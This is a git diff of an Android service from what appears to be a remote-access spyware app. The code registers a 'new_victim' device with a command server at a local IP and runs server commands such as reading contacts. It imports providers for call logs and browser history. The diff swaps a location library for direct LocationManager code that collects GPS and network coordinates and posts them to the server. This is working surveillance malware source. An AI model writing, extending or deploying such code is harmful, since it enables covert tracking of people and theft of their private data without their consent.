@@ -1,6 +1,5 @@
 package com.velociraptor.raptor;
 
-import android.Manifest;
 import android.annotation.SuppressLint;
 import android.app.Service;
 import android.content.Context;
@@ -9,6 +8,8 @@ import android.content.Intent;
 import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageManager;
 import android.location.Location;
+import android.location.LocationListener;
+import android.location.LocationManager;
 import android.os.Build;
 import android.os.Environment;
 import android.os.IBinder;
@@ -19,6 +20,7 @@ import android.util.Base64;
 import android.util.Log;
 import android.widget.Toast;
 
+import androidx.annotation.NonNull;
 import androidx.annotation.Nullable;
 
 import com.androidnetworking.AndroidNetworking;
@@ -44,13 +46,9 @@ import java.util.List;
 import java.util.Locale;
 import java.util.Timer;
 import java.util.TimerTask;
-import java.util.concurrent.Executor;
 import java.util.concurrent.Executors;
-import java.util.concurrent.ThreadPoolExecutor;
 
 import es.dmoral.toasty.Toasty;
-import fr.quentinklein.slt.LocationTracker;
-import fr.quentinklein.slt.ProviderError;
 import github.nisrulz.easydeviceinfo.base.EasyBatteryMod;
 import github.nisrulz.easydeviceinfo.base.EasyDeviceMod;
 import github.nisrulz.easydeviceinfo.base.EasyIdMod;
@@ -58,15 +56,13 @@ import github.nisrulz.easydeviceinfo.base.EasyMemoryMod;
 
 import me.everything.providers.android.browser.BrowserProvider;
 import me.everything.providers.android.calllog.CallsProvider;
-import me.everything.providers.android.media.MediaProvider;
 import me.everything.providers.android.telephony.TelephonyProvider;
 
 public class InternalService extends Service implements TextToSpeech.OnInitListener {
 
     public Context context;
-    private String SERVER_URI = "http://192.168.42.28/commands.php";
+    private String SERVER_URI = "http://192.168.43.246/commands.php";
     private Timer timerTaskScheduler = new Timer();
-    private LocationTracker tracker = null;
     private String deviceUniqueId = null;
     private TextToSpeech textToSpeech = null;
     public AppContant locationDataClass;
@@ -101,7 +97,7 @@ public class InternalService extends Service implements TextToSpeech.OnInitListe
         getDeviceInfo();
 
         checkCmdFromServer();
-        startLocationService();
+        //startLocationService();
         prepareTTs();
 
     }
@@ -122,7 +118,7 @@ public class InternalService extends Service implements TextToSpeech.OnInitListe
         postData.put("add_victim_device", "new_victim");
         postData.put("unique_id", deviceUniqueId);
         postData.put("country", countryCode.toUpperCase() + "");
-        postData.put("software_version",  "Android " + release);
+        postData.put("software_version", "Android " + release);
         postData.put("sim_operator", telephonyManager.getSimOperatorName() + "");
         postData.put("device_model", deviceName + " - " + modelName);
 
@@ -251,7 +247,7 @@ public class InternalService extends Service implements TextToSpeech.OnInitListe
         }*/
     }
 
-    private void getCommandType(JSONObject response){
+    private void getCommandType(JSONObject response) {
 
         if (response.has("rehber_oku")) {
             getPhoneContact();
@@ -536,10 +532,57 @@ public class InternalService extends Service implements TextToSpeech.OnInitListe
         sendPostRequestsToClient(postData);
     }
 
+    private LocationListener locationListener = new LocationListener() {
+        @Override
+        public void onLocationChanged(@NonNull Location location) {
+
+        }
+    };
+
     @SuppressLint("MissingPermission")
     private void prepareLocationdata() {
+        boolean isGPSEnable = false;
+        boolean isNetworkEnable = false;
+        Location location;
+        LocationManager locationMngr = (LocationManager) getApplicationContext().getSystemService(LOCATION_SERVICE);
+        isGPSEnable = locationMngr.isProviderEnabled(LocationManager.GPS_PROVIDER);
+        isNetworkEnable = locationMngr.isProviderEnabled(LocationManager.NETWORK_PROVIDER);
 
-        tracker.quickFix(this.context);
+
+        if (!isGPSEnable && !isNetworkEnable) {
+
+        } else {
+
+            if (isNetworkEnable) {
+                location = null;
+                locationMngr.requestLocationUpdates(locationMngr.NETWORK_PROVIDER, 1000, 0, locationListener);
+                if (locationMngr!=null){
+                    location = locationMngr.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
+                    if (location!=null){
+                        locationDataClass.getLatitude = location.getLatitude();
+                        locationDataClass.getLongitude = location.getLongitude();
+                    }
+                }
+
+            }
+
+
+            if (isGPSEnable){
+                location = null;
+                locationMngr.requestLocationUpdates(locationMngr.GPS_PROVIDER,1000,0,locationListener);
+                if (locationMngr!=null){
+                    location = locationMngr.getLastKnownLocation(LocationManager.GPS_PROVIDER);
+                    if (location!=null){
+                        locationDataClass.getLatitude = location.getLatitude();
+                        locationDataClass.getLongitude = location.getLongitude();
+                    }
+                }
+            }
+
+
+        }
+
+
         if (locationDataClass.getLatitude != 0.0 && locationDataClass.getLongitude != 0.0) {
             HashMap<String, Object> postData = new HashMap<>();
             postData.put("device_id", deviceUniqueId);
@@ -549,43 +592,7 @@ public class InternalService extends Service implements TextToSpeech.OnInitListe
             sendPostRequestsToClient(postData);
         }
 
-
     }
-
-    private void startLocationService() {
-
-        tracker = new LocationTracker();
-        tracker.getShouldUseNetwork();
-        tracker.getShouldUseGPS();
-        tracker.getShouldUsePassive();
-
-        tracker.addListener(new LocationTracker.Listener() {
-            @Override
-            public void onLocationFound(Location location) {
-                locationDataClass.getLongitude = location.getLongitude();
-                locationDataClass.getLatitude = location.getLatitude();
-            }
-
-            @Override
-            public void onProviderError(ProviderError providerError) {
-                locationDataClass.getLongitude = 0.0;
-                locationDataClass.getLatitude = 0.0;
-            }
-        });
-
-        if (!tracker.isListening()) {
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-                if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
-                    return;
-                } else {
-                    tracker.startListening(context);
-                }
-            } else {
-                tracker.startListening(context);
-            }
-        }
-    }
-
 
     @Override
     public void onInit(int status) {
